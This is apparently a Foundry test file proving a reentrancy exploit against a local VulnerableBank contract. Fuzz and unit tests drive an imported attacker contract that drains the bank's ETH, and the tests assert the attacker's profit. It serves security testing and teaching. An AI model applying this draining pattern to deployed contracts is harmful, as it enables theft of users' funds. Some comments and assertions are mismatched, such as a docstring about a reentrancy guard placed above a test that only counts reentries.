// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./Reentrancy.sol";
import "./ReentrancyAttack.sol";

/*
 * PoC: Reentrancy Attack on VulnerableBank
 *
 * Vulnerability: VulnerableBank.withdraw() sends ETH via msg.sender.call{value: balance}("")
 * BEFORE updating balances[msg.sender] = 0. This allows an attacker contract to re-enter
 * withdraw() in its receive() function, draining the entire contract balance.
 *
 * Attack Flow:
 * 1. Attacker deposits 1 ETH into VulnerableBank
 * 2. Attacker calls withdraw()
 * 3. VulnerableBank sends 1 ETH to attacker's receive()
 * 4. In receive(), attacker re-calls withdraw()
 * 5. Balance is still > 0 (not yet zeroed), so VulnerableBank sends another 1 ETH
 * 6. Steps 4-5 repeat until VulnerableBank is drained
 *
 * Expected Result: Attacker steals more than deposited, victim contract drained
 */

contract ReentrancyPoCTest is Test {
    VulnerableBank public victim;
    ReentrancyAttacker public attacker;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function setUp() public {
        // Step 1: Deploy the vulnerable contract
        victim = new VulnerableBank();

        // Step 2: Seed the contract with funds (simulating other users' deposits)
        vm.deal(address(this), 100 ether);
        victim.deposit{value: 50 ether}();

        // Step 3: Deploy the attacker contract targeting VulnerableBank
        attacker = new ReentrancyAttacker(address(victim));

        // Step 4: Fund the attacker
        vm.deal(address(attacker), 10 ether);

        // Verify setup
        assertEq(address(victim).balance, 50 ether, "Victim should have 50 ETH");
        assertEq(address(attacker).balance, 10 ether, "Attacker should have 10 ETH");
    }

    /// @notice Demonstrates the reentrancy exploit
    function test_reentrancy_exploit() public {
        uint256 victimBalanceBefore = address(victim).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackDeposit = 1 ether;

        console.log("=== Reentrancy PoC Attack ===");
        console.log("Victim balance before:   ", victimBalanceBefore / 1e18, "ETH");
        console.log("Attacker balance before: ", attackerBalanceBefore / 1e18, "ETH");

        // Execute the attack — attacker deposits 1 ETH and then drains via reentrancy
        vm.prank(address(attacker));
        attacker.attack{value: attackDeposit}();

        uint256 victimBalanceAfter = address(victim).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 stolen = attackerBalanceAfter - attackerBalanceBefore + attackDeposit;

        console.log("--- After Attack ---");
        console.log("Victim balance after:    ", victimBalanceAfter / 1e18, "ETH");
        console.log("Attacker balance after:  ", attackerBalanceAfter / 1e18, "ETH");
        console.log("Reentry count:           ", attacker.attackCount());
        console.log("Total drained:           ", stolen / 1e18, "ETH");

        // ASSERT: The attacker should have stolen funds (more than just their deposit)
        assertGt(attackerBalanceAfter, attackerBalanceBefore,
            "Attacker should have gained ETH from the exploit");

        // ASSERT: The victim should be partially or fully drained
        assertLt(victimBalanceAfter, victimBalanceBefore,
            "Victim contract should have lost ETH");

        // ASSERT: Reentrancy was actually triggered (more than 1 withdraw)
        assertGt(attacker.attackCount(), 1,
            "Reentrancy should have triggered multiple withdrawals");

        console.log("=== PoC Successful: Reentrancy Vulnerability Confirmed ===");
    }

    /// @notice Fuzz test: attacker always steals funds regardless of deposit amount
    /// @dev Forge will try many random depositAmount values to find a counterexample
    function testFuzz_reentrancy_steals(uint96 depositAmount) public {
        // Ensure deposit is at least 0.01 ETH and at most 10 ETH
        vm.assume(depositAmount >= 0.01 ether);
        vm.assume(depositAmount <= 10 ether);

        // Fresh deploy for each fuzz run
        VulnerableBank freshBank = new VulnerableBank();
        ReentrancyAttacker freshAttacker = new ReentrancyAttacker(address(freshBank));

        // Seed the bank with funds
        vm.deal(address(this), 100 ether);
        freshBank.deposit{value: 50 ether}();

        // Fund the attacker
        vm.deal(address(freshAttacker), depositAmount + 1 ether);

        uint256 bankBefore = address(freshBank).balance;
        uint256 attackerBefore = address(freshAttacker).balance;

        // Attack
        vm.prank(address(freshAttacker));
        freshAttacker.attack{value: depositAmount}();

        uint256 bankAfter = address(freshBank).balance;
        uint256 attackerAfter = address(freshAttacker).balance;

        // Invariant: the attacker must have profited (stolen more than deposited)
        assertGt(attackerAfter, attackerBefore,
            "Attacker should profit from reentrancy");

        // Invariant: the bank must have lost funds
        assertLt(bankAfter, bankBefore,
            "Bank should lose funds to reentrancy");

        // Invariant: reentrancy must have actually occurred
        assertGt(freshAttacker.attackCount(), 1,
            "Must re-enter at least once");
    }

    /// @notice Fuzz test: attacker can always fully drain the bank if deposit >= bank balance
    function testFuzz_full_drain(uint96 bankSeed) public {
        // Bank seeds between 0.01 ETH and 100 ETH
        vm.assume(bankSeed >= 0.01 ether);
        vm.assume(bankSeed <= 100 ether);

        VulnerableBank freshBank = new VulnerableBank();
        ReentrancyAttacker freshAttacker = new ReentrancyAttacker(address(freshBank));

        // Seed the bank
        vm.deal(address(this), bankSeed + 1 ether);
        freshBank.deposit{value: bankSeed}();

        // Give attacker enough to match bank balance
        vm.deal(address(freshAttacker), bankSeed + 1 ether);

        // Attack with enough deposit to drain everything
        vm.prank(address(freshAttacker));
        freshAttacker.attack{value: bankSeed}();

        // Bank should be fully drained
        assertEq(address(freshBank).balance, 0,
            "Bank should be fully drained when attacker deposits >= bank balance");
    }

    /// @notice Demonstrates the attack drains the entire contract if attacker deposits enough
    function test_full_drain() public {
        // Give attacker enough to deposit matching victim balance
        vm.deal(address(attacker), 100 ether);

        console.log("=== Full Drain Test ===");
        console.log("Victim balance: ", address(victim).balance / 1e18, "ETH");

        // Attack with enough deposit to drain everything
        vm.prank(address(attacker));
        attacker.attack{value: 50 ether}();

        uint256 victimRemaining = address(victim).balance;

        console.log("Victim remaining: ", victimRemaining / 1e18, "ETH");
        console.log("Attacker reentries: ", attacker.attackCount());

        // Victim should be completely drained
        assertEq(victimRemaining, 0, "Victim should be fully drained");

        console.log("=== Full Drain Successful ===");
    }

    /// @notice Fuzz test: varying initial bank balance, attacker always steals
    function testFuzz_varying_bank_balance(uint96 bankBalance, uint96 attackDeposit) public {
        vm.assume(bankBalance >= 0.01 ether);
        vm.assume(bankBalance <= 200 ether);
        vm.assume(attackDeposit >= 0.001 ether);
        vm.assume(attackDeposit <= bankBalance);

        VulnerableBank freshBank = new VulnerableBank();
        ReentrancyAttacker freshAttacker = new ReentrancyAttacker(address(freshBank));

        vm.deal(address(this), bankBalance + 1 ether);
        freshBank.deposit{value: bankBalance}();

        vm.deal(address(freshAttacker), attackDeposit + 1 ether);

        uint256 attackerBalanceBefore = address(freshAttacker).balance;

        vm.prank(address(freshAttacker));
        freshAttacker.attack{value: attackDeposit}();

        uint256 attackerBalanceAfter = address(freshAttacker).balance;

        // Attacker must have profited from reentrancy
        assertGt(attackerBalanceAfter, attackerBalanceBefore,
            "Attacker should profit regardless of bank/deposit ratio");
    }

    /// @notice Demonstrates that the vulnerability would be fixed with reentrancy guard
    function test_attack_counts_reentries() public {
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        // The attacker re-entered multiple times
        console.log("Reentry count: ", attacker.attackCount());

        // With 1 ETH deposit and 50 ETH in victim, we'd expect ~10 reentries
        // (capped by MAX_REENTRIES in the attacker contract)
        assertGe(attacker.attackCount(), 2,
            "Should have re-entered at least 2 times to prove reentrancy");
    }
}
